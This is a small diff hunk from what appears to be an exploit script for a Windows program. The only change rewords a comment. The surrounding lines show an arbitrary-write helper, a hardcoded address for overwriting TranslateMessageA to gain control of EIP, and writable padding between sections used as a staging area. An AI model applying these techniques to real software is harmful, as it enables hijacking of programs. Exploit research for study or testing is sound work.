@@ -43,7 +43,7 @@ def write_dword_anywhere(data, addr):
 # write to this location to overwrite TranslateMessageA and gain EIP
 translate_msg_addr = 0x00454358
 
-# beginning of padding at the end of a section - only 0x40 to play with
+# beginning of writable padding between sections - only 0x40 to play with
 end_of_section = 0x00452DD4
 
 # a couple of a useful debugging target addresses
